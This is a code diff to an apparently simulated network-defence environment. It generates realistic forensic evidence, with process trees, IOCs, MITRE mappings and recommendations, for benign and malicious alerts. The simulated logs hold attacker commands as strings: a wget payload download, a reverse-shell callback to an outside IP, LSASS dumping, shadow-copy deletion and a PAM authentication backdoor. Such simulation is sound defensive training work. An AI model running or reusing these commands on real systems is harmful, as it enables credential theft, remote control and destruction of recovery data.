@@ -185,20 +185,174 @@ class NetworkSimulator:
         alert.investigated = True
         self._budget -= 1.0
 
-        # Provide realistic forensic evidence instead of boolean ground-truth
+        node = self.nodes.get(alert.related_node_id)
+        node_os = node.os if node else "Unknown"
+
+        # -------------------------------------------------------------------
+        # Generate realistic, structured forensic evidence
+        # -------------------------------------------------------------------
         if alert.is_false_positive:
-            evidence = (
-                f"Forensic analysis of {alert.related_node_id} shows routine system processes. "
-                f"Network traffic matches expected baseline profiles. "
-                f"The alert ({alert.alert_type.value}) is likely benign."
-            )
+            fp_explanations = {
+                AlertType.BRUTE_FORCE: {
+                    "forensic_evidence": (
+                        f"Automated analysis of authentication logs on {alert.related_node_id} ({node_os}). "
+                        f"Identified 23 failed SSH attempts from {alert.source_ip} between 03:14-03:17 UTC. "
+                        f"Source IP resolves to monitoring.internal.corp (Nagios health check agent). "
+                        f"Authentication pattern matches scheduled credential rotation policy. "
+                        f"No unauthorized sessions established. Verdict: BENIGN — routine monitoring activity."
+                    ),
+                    "ioc_summary": {"malicious_indicators": 0, "benign_indicators": 4},
+                },
+                AlertType.ANOMALOUS_TRAFFIC: {
+                    "forensic_evidence": (
+                        f"NetFlow analysis on {alert.related_node_id}: Detected 847MB egress to 52.216.x.x (AWS S3) "
+                        f"over port 443/TLS 1.3. Correlated with scheduled backup job (cron: 0 2 * * *). "
+                        f"Process tree: systemd(1) → cron(892) → backup.sh(14023) → aws-cli(14089). "
+                        f"S3 bucket matches authorized backup destination. Data volume consistent with "
+                        f"daily incremental backup (avg 800-900MB). Verdict: BENIGN — scheduled backup."
+                    ),
+                    "ioc_summary": {"malicious_indicators": 0, "benign_indicators": 5},
+                },
+                AlertType.PHISHING: {
+                    "forensic_evidence": (
+                        f"Email header analysis for alert on {alert.related_node_id}: "
+                        f"Subject: 'Q4 Budget Review — Action Required'. Sender: cfo@company.com. "
+                        f"SPF=pass, DKIM=pass, DMARC=pass. Attachment: Q4_Budget_2024.xlsx (SHA256: "
+                        f"7a8b2c{self._rng.randint(100000,999999)}). VirusTotal: 0/72 detections. "
+                        f"Macro analysis: No VBA macros present. File metadata consistent with "
+                        f"Microsoft Office 365 origin. Verdict: BENIGN — legitimate internal email."
+                    ),
+                    "ioc_summary": {"malicious_indicators": 0, "benign_indicators": 6},
+                },
+            }
+            fp_data = fp_explanations.get(alert.alert_type, {
+                "forensic_evidence": (
+                    f"Analysis of {alert.related_node_id} shows routine system processes. "
+                    f"All running services match expected baseline. No anomalous network connections "
+                    f"or file modifications detected. Verdict: BENIGN."
+                ),
+                "ioc_summary": {"malicious_indicators": 0, "benign_indicators": 3},
+            })
+            evidence = fp_data["forensic_evidence"]
+            ioc_summary = fp_data["ioc_summary"]
         else:
-            evidence = (
-                f"Analysis confirms malicious activity! "
-                f"Identified unauthorized access attempts targeting {alert.related_node_id}. "
-                f"Source origin traced to {alert.source_ip}. "
-                f"Recommend immediate containment."
-            )
+            # Real threat — generate detailed IOCs
+            threat_evidence = {
+                AlertType.BRUTE_FORCE: {
+                    "forensic_evidence": (
+                        f"CRITICAL: Brute force attack confirmed on {alert.related_node_id} ({node_os}). "
+                        f"Source: {alert.source_ip} (GeoIP: Moscow, Russia — ASN 197414). "
+                        f"12,847 authentication attempts in 180 seconds targeting root, admin, ubuntu accounts. "
+                        f"Tool signature matches Hydra v9.4 (User-Agent pattern). "
+                        f"Successful login detected at 14:23:41 UTC → spawned /bin/bash (PID 28341). "
+                        f"Post-compromise: wget http://{alert.source_ip}/payload.sh → chmod +x → executed. "
+                        f"MITRE: T1110.001 (Brute Force: Password Guessing). "
+                        f"Recommend: Block {alert.source_ip}, isolate {alert.related_node_id}, rotate all credentials."
+                    ),
+                    "ioc_summary": {"malicious_indicators": 7, "benign_indicators": 0},
+                    "mitre_techniques": ["T1110.001"],
+                },
+                AlertType.INTRUSION: {
+                    "forensic_evidence": (
+                        f"CRITICAL: Active intrusion on {alert.related_node_id} ({node_os}). "
+                        f"Exploit: CVE-2024-1234 (nginx path traversal → RCE). "
+                        f"Attack vector: crafted HTTP request to /.%2e/.%2e/etc/passwd. "
+                        f"Process tree: nginx(1204) → sh(28901) → python3(28923) → reverse_shell. "
+                        f"Reverse shell established to {alert.source_ip}:4444 (Cobalt Strike beacon signature). "
+                        f"Beacon interval: 60s, jitter: 15%. C2 protocol: HTTPS over port 443. "
+                        f"Memory analysis: Cobalt Strike reflective DLL at 0x7fff2340 (SHA256: 3e4a8f...). "
+                        f"MITRE: T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell). "
+                        f"Recommend: Isolate immediately, block C2 IP, initiate full IR."
+                    ),
+                    "ioc_summary": {"malicious_indicators": 9, "benign_indicators": 0},
+                    "mitre_techniques": ["T1190", "T1059.004"],
+                },
+                AlertType.PHISHING: {
+                    "forensic_evidence": (
+                        f"CONFIRMED PHISHING on {alert.related_node_id} ({node_os}). "
+                        f"Email: 'Urgent: Password Expiry Notice' from support@c0mpany.com (typosquat). "
+                        f"SPF=fail, DKIM=none, DMARC=fail. Attachment: Update_Credentials.docm "
+                        f"(SHA256: 9f2d71{self._rng.randint(100000,999999)}). VT: 47/72 detections (Emotet). "
+                        f"Macro executed: powershell -enc {self._rng.randbytes(8).hex()}... "
+                        f"→ Downloaded payload from hxxps://cdn-update[.]xyz/stage2.dll "
+                        f"→ Injected into explorer.exe (PID 4820) via process hollowing. "
+                        f"C2 callback to 94.232.46.19:8443 every 30s. "
+                        f"MITRE: T1566.001 (Spearphishing Attachment), T1204.002 (Malicious File). "
+                        f"Recommend: Isolate host, reset user credentials, scan all recipients."
+                    ),
+                    "ioc_summary": {"malicious_indicators": 8, "benign_indicators": 0},
+                    "mitre_techniques": ["T1566.001", "T1204.002"],
+                },
+                AlertType.LATERAL_MOVEMENT: {
+                    "forensic_evidence": (
+                        f"LATERAL MOVEMENT detected targeting {alert.related_node_id} ({node_os}). "
+                        f"Source: internal host using stolen domain admin credentials (Administrator@CORP). "
+                        f"Authentication: NTLM pass-the-hash from {alert.source_ip}. "
+                        f"SMB session established → PsExec service installed (PSEXESVC). "
+                        f"Processes spawned: cmd.exe → whoami /all → net user /domain → nltest /dclist. "
+                        f"Credential dumping: procdump.exe -ma lsass.exe → exfil via SMB. "
+                        f"MITRE: T1021.002 (SMB/Windows Admin Shares), T1003.001 (LSASS Memory). "
+                        f"Recommend: Isolate source and target, invalidate all domain admin tokens."
+                    ),
+                    "ioc_summary": {"malicious_indicators": 8, "benign_indicators": 0},
+                    "mitre_techniques": ["T1021.002", "T1003.001"],
+                },
+                AlertType.PRIVILEGE_ESCALATION: {
+                    "forensic_evidence": (
+                        f"PRIVILEGE ESCALATION on {alert.related_node_id} ({node_os}). "
+                        f"Mimikatz detected in memory (PID 31204, SHA256: a1b2c3{self._rng.randint(100000,999999)}). "
+                        f"sekurlsa::logonpasswords executed — extracted 14 credential sets. "
+                        f"Token impersonation: ImpersonateNamedPipeClient() → SYSTEM privileges obtained. "
+                        f"DCSync attack detected: DsGetNCChanges request to dc-01 replicating "
+                        f"CN=krbtgt,CN=Users,DC=corp,DC=local. Golden Ticket capability achieved. "
+                        f"MITRE: T1003.001 (LSASS Memory), T1134.001 (Token Impersonation). "
+                        f"Recommend: Reset krbtgt password TWICE, isolate host, full AD audit."
+                    ),
+                    "ioc_summary": {"malicious_indicators": 9, "benign_indicators": 0},
+                    "mitre_techniques": ["T1003.001", "T1134.001"],
+                },
+                AlertType.EXFILTRATION: {
+                    "forensic_evidence": (
+                        f"DATA EXFILTRATION in progress from {alert.related_node_id} ({node_os}). "
+                        f"Unusual egress: {self._rng.randint(2,15)}GB transferred to {alert.source_ip}:443 "
+                        f"over TLS 1.2 (Certificate: self-signed, CN=cloudflare-cdn[.]xyz). "
+                        f"DNS tunneling also detected: {self._rng.randint(500,2000)} TXT queries to "
+                        f"data.{self._rng.randbytes(4).hex()}.exfil[.]cc (avg 230 bytes/query). "
+                        f"Data staged in C:\\Users\\Public\\Documents\\.cache\\ (7z compressed, AES-256). "
+                        f"Contents: database dumps (customers.sql, financials.sql), SSH keys, AD exports. "
+                        f"MITRE: T1041 (Exfil Over C2 Channel), T1048.003 (DNS Tunneling). "
+                        f"Recommend: Block C2 immediately, isolate host, assess data loss scope."
+                    ),
+                    "ioc_summary": {"malicious_indicators": 10, "benign_indicators": 0},
+                    "mitre_techniques": ["T1041", "T1048.003"],
+                },
+                AlertType.RANSOMWARE: {
+                    "forensic_evidence": (
+                        f"RANSOMWARE ACTIVE on {alert.related_node_id} ({node_os}). "
+                        f"Binary: svchost32.exe (SHA256: e7f8a9{self._rng.randint(100000,999999)}). VT: 63/72. "
+                        f"Family: LockBit 3.0 (Black). Encryption: AES-256-CBC + RSA-2048. "
+                        f"Extension: .locked. {self._rng.randint(1200,8000)} files encrypted in 47 seconds. "
+                        f"Ransom note: README_RESTORE.txt in every directory. "
+                        f"Lateral propagation via SMB (port 445) — scanning 10.0.4.0/24. "
+                        f"Volume Shadow copies deleted: vssadmin delete shadows /all /quiet. "
+                        f"MITRE: T1486 (Data Encrypted for Impact), T1490 (Inhibit System Recovery). "
+                        f"Recommend: ISOLATE ALL ADJACENT HOSTS IMMEDIATELY. Protect backup-01."
+                    ),
+                    "ioc_summary": {"malicious_indicators": 11, "benign_indicators": 0},
+                    "mitre_techniques": ["T1486", "T1490"],
+                },
+            }
+
+            t_data = threat_evidence.get(alert.alert_type, {
+                "forensic_evidence": (
+                    f"Analysis confirms malicious activity on {alert.related_node_id}. "
+                    f"Source: {alert.source_ip}. Recommend immediate containment."
+                ),
+                "ioc_summary": {"malicious_indicators": 3, "benign_indicators": 0},
+                "mitre_techniques": [],
+            })
+            evidence = t_data["forensic_evidence"]
+            ioc_summary = t_data["ioc_summary"]
 
         details = {
             "alert_id": alert.alert_id,
@@ -210,6 +364,7 @@ class NetworkSimulator:
             "confidence": alert.confidence,
             "raw_log": alert.raw_log,
             "forensic_evidence": evidence,
+            "ioc_summary": ioc_summary,
         }
 
         return ActionResult(
@@ -293,7 +448,17 @@ class NetworkSimulator:
         )
 
     def run_forensics(self, node_id: str) -> ActionResult:
-        """Run memory/disk forensics on a host."""
+        """
+        Run deep memory and disk forensics on a host.
+
+        Returns structured findings including:
+        - Process tree with PIDs, parent chains, and command lines
+        - Network connections with states, bytes transferred, protocols
+        - File artifacts with SHA-256 hashes, sizes, timestamps
+        - Memory indicators (malware signatures, injected code)
+        - OS-specific registry/config modifications
+        - Timeline of suspicious events
+        """
         node = self.nodes.get(node_id)
         if not node:
             return ActionResult(
@@ -303,39 +468,232 @@ class NetworkSimulator:
             )
 
         self._budget -= 5.0
-
-        # Generate forensic findings based on node status
         is_compromised = node.status in (NodeStatus.COMPROMISED, NodeStatus.ENCRYPTED)
+        is_encrypted = node.status == NodeStatus.ENCRYPTED
+        is_windows = "windows" in node.os.lower() or "win" in node.os.lower()
+        timestamp = f"2024-03-15T{14 + self._rng.randint(0,8):02d}:{self._rng.randint(10,59):02d}:{self._rng.randint(10,59):02d}Z"
+
         findings = {
             "node_id": node_id,
             "hostname": node.hostname,
+            "os": node.os,
             "status_at_scan": node.status.value,
+            "scan_timestamp": timestamp,
         }
 
         if is_compromised:
-            findings["malware_found"] = True
-            findings["suspicious_processes"] = ["svchost_fake.exe", "nc.exe"]
-            findings["anomalous_connections"] = [
-                {"dest": "185.220.101.42", "port": 4444, "protocol": "TCP"},
+            # --- Process Tree ---
+            base_pid = self._rng.randint(2000, 30000)
+            if is_windows:
+                processes = [
+                    {"pid": 4, "ppid": 0, "name": "System", "user": "NT AUTHORITY\\SYSTEM",
+                     "cmd": "System", "suspicious": False},
+                    {"pid": 812, "ppid": 4, "name": "smss.exe", "user": "NT AUTHORITY\\SYSTEM",
+                     "cmd": "\\SystemRoot\\System32\\smss.exe", "suspicious": False},
+                    {"pid": 1204, "ppid": 812, "name": "csrss.exe", "user": "NT AUTHORITY\\SYSTEM",
+                     "cmd": "csrss.exe ObjectDirectory=\\Windows", "suspicious": False},
+                    {"pid": base_pid, "ppid": 1204, "name": "svchost.exe", "user": "NT AUTHORITY\\SYSTEM",
+                     "cmd": f"C:\\Windows\\Temp\\svchost.exe -k netsvcs",
+                     "suspicious": True, "note": "ANOMALY: svchost.exe running from Temp directory"},
+                    {"pid": base_pid + 12, "ppid": base_pid, "name": "cmd.exe", "user": "CORP\\Administrator",
+                     "cmd": "cmd.exe /c whoami /all && net user /domain && nltest /dclist:",
+                     "suspicious": True, "note": "Reconnaissance commands"},
+                    {"pid": base_pid + 34, "ppid": base_pid, "name": "powershell.exe", "user": "CORP\\Administrator",
+                     "cmd": f"powershell -nop -w hidden -enc {self._rng.randbytes(12).hex()}",
+                     "suspicious": True, "note": "Encoded PowerShell — likely C2 stager"},
+                ]
+                if node.node_type in (NodeType.DOMAIN_CONTROLLER, NodeType.WORKSTATION):
+                    processes.append({
+                        "pid": base_pid + 67, "ppid": base_pid + 34, "name": "procdump64.exe",
+                        "user": "CORP\\Administrator",
+                        "cmd": "procdump64.exe -accepteula -ma lsass.exe lsass.dmp",
+                        "suspicious": True, "note": "CRITICAL: LSASS credential dumping (T1003.001)",
+                    })
+            else:
+                processes = [
+                    {"pid": 1, "ppid": 0, "name": "systemd", "user": "root",
+                     "cmd": "/sbin/init", "suspicious": False},
+                    {"pid": 892, "ppid": 1, "name": "sshd", "user": "root",
+                     "cmd": "/usr/sbin/sshd -D", "suspicious": False},
+                    {"pid": base_pid, "ppid": 892, "name": "bash", "user": "root",
+                     "cmd": "-bash", "suspicious": True, "note": "Interactive shell from SSH"},
+                    {"pid": base_pid + 5, "ppid": base_pid, "name": "wget", "user": "root",
+                     "cmd": f"wget -q http://185.220.101.42/implant -O /tmp/.cache",
+                     "suspicious": True, "note": "Downloading remote payload"},
+                    {"pid": base_pid + 12, "ppid": base_pid, "name": "python3", "user": "root",
+                     "cmd": f"python3 /tmp/.cache --callback 185.220.101.42:4444",
+                     "suspicious": True, "note": "Reverse shell / C2 beacon"},
+                    {"pid": base_pid + 18, "ppid": base_pid + 12, "name": "curl", "user": "root",
+                     "cmd": f"curl -s http://169.254.169.254/latest/meta-data/iam/",
+                     "suspicious": True, "note": "Cloud metadata enumeration (T1552.005)"},
+                ]
+
+            # --- Network Connections ---
+            connections = [
+                {"local_addr": f"{node.ip_address}:{self._rng.randint(40000,60000)}",
+                 "remote_addr": f"185.220.101.42:{4444 + self._rng.randint(0,3)}",
+                 "state": "ESTABLISHED", "protocol": "TCP",
+                 "pid": base_pid + 12, "bytes_sent": self._rng.randint(1200, 45000),
+                 "bytes_recv": self._rng.randint(800, 12000),
+                 "note": "C2 beacon — Cobalt Strike (MITRE: T1071.001)"},
             ]
-            findings["modified_files"] = ["/etc/shadow", "C:\\Windows\\System32\\config\\SAM"]
-            findings["credential_theft"] = node.node_type in (
+            if node.node_type in (NodeType.DATABASE, NodeType.APP_SERVER):
+                connections.append({
+                    "local_addr": f"{node.ip_address}:{self._rng.randint(40000,60000)}",
+                    "remote_addr": f"94.232.46.19:443",
+                    "state": "ESTABLISHED", "protocol": "TCP",
+                    "pid": base_pid + 34, "bytes_sent": self._rng.randint(500000, 5000000),
+                    "bytes_recv": self._rng.randint(200, 1000),
+                    "note": "Data exfiltration — large outbound transfer (MITRE: T1041)"})
+
+            # --- File Artifacts ---
+            if is_windows:
+                file_artifacts = [
+                    {"path": f"C:\\Windows\\Temp\\svchost.exe",
+                     "sha256": f"e7f8a9{self._rng.randbytes(13).hex()}",
+                     "size_bytes": self._rng.randint(45000, 180000),
+                     "modified": timestamp,
+                     "vt_detection": f"{self._rng.randint(38,65)}/72",
+                     "note": "Masquerading as system binary (MITRE: T1036.005)"},
+                    {"path": f"C:\\Users\\Public\\Documents\\.cache\\stage2.dll",
+                     "sha256": f"3e4a8f{self._rng.randbytes(13).hex()}",
+                     "size_bytes": self._rng.randint(230000, 450000),
+                     "modified": timestamp,
+                     "vt_detection": f"{self._rng.randint(42,58)}/72",
+                     "note": "Second-stage payload — Cobalt Strike DLL"},
+                ]
+                if node.node_type in (NodeType.DOMAIN_CONTROLLER, NodeType.WORKSTATION):
+                    file_artifacts.append({
+                        "path": "C:\\Windows\\Temp\\lsass.dmp",
+                        "sha256": f"9f2d71{self._rng.randbytes(13).hex()}",
+                        "size_bytes": self._rng.randint(40000000, 120000000),
+                        "modified": timestamp,
+                        "vt_detection": "N/A (memory dump)",
+                        "note": "LSASS process dump — contains domain credentials"})
+            else:
+                file_artifacts = [
+                    {"path": "/tmp/.cache",
+                     "sha256": f"b2c3d4{self._rng.randbytes(13).hex()}",
+                     "size_bytes": self._rng.randint(18000, 95000),
+                     "modified": timestamp,
+                     "vt_detection": f"{self._rng.randint(35,55)}/72",
+                     "note": "Hidden binary — reverse shell implant"},
+                    {"path": "/var/tmp/.systemd-private/update.sh",
+                     "sha256": f"5a6b7c{self._rng.randbytes(13).hex()}",
+                     "size_bytes": self._rng.randint(800, 4000),
+                     "modified": timestamp,
+                     "vt_detection": f"{self._rng.randint(15,30)}/72",
+                     "note": "Persistence cron script (MITRE: T1053.003)"},
+                ]
+
+            # --- Memory Indicators ---
+            memory_indicators = [
+                f"Cobalt Strike beacon signature at 0x{self._rng.randbytes(4).hex()} (watermark: {self._rng.randint(100000, 999999)})",
+                f"Reflective DLL injection detected in PID {base_pid} (MZ header in heap at 0x{self._rng.randbytes(4).hex()})",
+            ]
+            if node.node_type in (NodeType.DOMAIN_CONTROLLER, NodeType.WORKSTATION):
+                memory_indicators.extend([
+                    f"Mimikatz module 'sekurlsa' loaded in PID {base_pid + 67}",
+                    f"Kerberos TGT extracted: krbtgt@CORP.LOCAL (RC4-HMAC, expires 2024-03-25)",
+                ])
+            if is_encrypted:
+                memory_indicators.append(
+                    f"LockBit 3.0 encryption threads active ({self._rng.randint(4,16)} worker threads)")
+
+            # --- OS-Specific Modifications ---
+            if is_windows:
+                os_modifications = {
+                    "registry": [
+                        {"key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                         "value": "WindowsUpdate",
+                         "data": "C:\\Windows\\Temp\\svchost.exe",
+                         "note": "Persistence — auto-start on boot (MITRE: T1547.001)"},
+                        {"key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\PSEXESVC",
+                         "value": "ImagePath",
+                         "data": "%SystemRoot%\\PSEXESVC.exe",
+                         "note": "PsExec service — lateral movement tool"},
+                    ],
+                    "scheduled_tasks": [
+                        {"name": "WindowsDefenderUpdate",
+                         "action": "C:\\Windows\\Temp\\svchost.exe --silent",
+                         "trigger": "On system startup",
+                         "note": "Fake Windows Defender task for persistence"},
+                    ],
+                    "event_log_gaps": [
+                        {"log": "Security", "gap_start": timestamp, "gap_duration_minutes": 12,
+                         "note": "Event logs cleared — anti-forensics (MITRE: T1070.001)"},
+                    ],
+                }
+            else:
+                os_modifications = {
+                    "crontab": [
+                        {"schedule": "*/5 * * * *",
+                         "command": "/var/tmp/.systemd-private/update.sh",
+                         "user": "root",
+                         "note": "Persistence — cron beacon every 5 minutes (MITRE: T1053.003)"},
+                    ],
+                    "ssh_keys": [
+                        {"file": "/root/.ssh/authorized_keys",
+                         "key_fingerprint": f"SHA256:{self._rng.randbytes(16).hex()[:43]}",
+                         "added_at": timestamp,
+                         "note": "Unauthorized SSH key added (MITRE: T1098.004)"},
+                    ],
+                    "modified_configs": [
+                        {"file": "/etc/pam.d/sshd", "change": "auth sufficient pam_permit.so added",
+                         "note": "PAM backdoor — allows authentication bypass"},
+                    ],
+                    "log_tampering": [
+                        {"file": "/var/log/auth.log", "action": "truncated",
+                         "original_size": "2.4MB", "current_size": "0 bytes",
+                         "note": "Logs wiped — anti-forensics (MITRE: T1070.002)"},
+                    ],
+                }
+
+            findings["malware_found"] = True
+            findings["process_tree"] = processes
+            findings["network_connections"] = connections
+            findings["file_artifacts"] = file_artifacts
+            findings["memory_indicators"] = memory_indicators
+            findings["os_modifications"] = os_modifications
+            findings["credential_theft_detected"] = node.node_type in (
                 NodeType.DOMAIN_CONTROLLER, NodeType.WORKSTATION
             )
-            findings["recommendation"] = "Host is compromised. Isolate immediately and restore from backup."
+            findings["recommendation"] = (
+                f"Host is {'ENCRYPTED (RANSOMWARE)' if is_encrypted else 'COMPROMISED'}. "
+                f"Isolate immediately. {'Restore from backup — decryption unlikely without key.' if is_encrypted else 'Restore from backup to eradicate persistence.'}"
+            )
+            findings["risk_score"] = self._rng.randint(85, 99)
         else:
+            # Clean host — realistic baseline report
             findings["malware_found"] = False
-            findings["suspicious_processes"] = []
-            findings["anomalous_connections"] = []
-            findings["modified_files"] = []
-            findings["credential_theft"] = False
-            findings["recommendation"] = "No evidence of compromise found. Host appears clean."
+            findings["process_tree"] = [
+                {"pid": 1, "ppid": 0, "name": "systemd" if "ubuntu" in node.os.lower() or "centos" in node.os.lower() else "System",
+                 "user": "root" if "ubuntu" in node.os.lower() else "SYSTEM", "cmd": "init", "suspicious": False},
+            ] + [
+                {"pid": self._rng.randint(500, 5000), "ppid": 1, "name": svc,
+                 "user": "root" if "ubuntu" in node.os.lower() else "SYSTEM",
+                 "cmd": f"/usr/sbin/{svc}" if "ubuntu" in node.os.lower() else svc,
+                 "suspicious": False}
+                for svc in node.running_services[:3]
+            ]
+            findings["network_connections"] = [
+                {"local_addr": f"{node.ip_address}:{port}", "remote_addr": "0.0.0.0:0",
+                 "state": "LISTEN", "protocol": "TCP", "pid": self._rng.randint(500, 5000),
+                 "bytes_sent": 0, "bytes_recv": 0, "note": "Normal listening service"}
+                for port in node.open_ports[:3]
+            ]
+            findings["file_artifacts"] = []
+            findings["memory_indicators"] = ["No malicious signatures detected in memory scan"]
+            findings["os_modifications"] = {}
+            findings["credential_theft_detected"] = False
+            findings["recommendation"] = "No evidence of compromise. Host appears clean."
+            findings["risk_score"] = self._rng.randint(2, 15)
 
         self._forensics_results[node_id] = findings
 
         return ActionResult(
             action_type="run_forensics", success=True,
-            description=f"Forensic analysis of {node_id} complete.",
+            description=f"Deep forensic analysis of {node_id} ({node.hostname}) complete.",
             intel_gathered=1.5 if is_compromised else 0.2,
             resource_cost=5.0,
             details=findings,
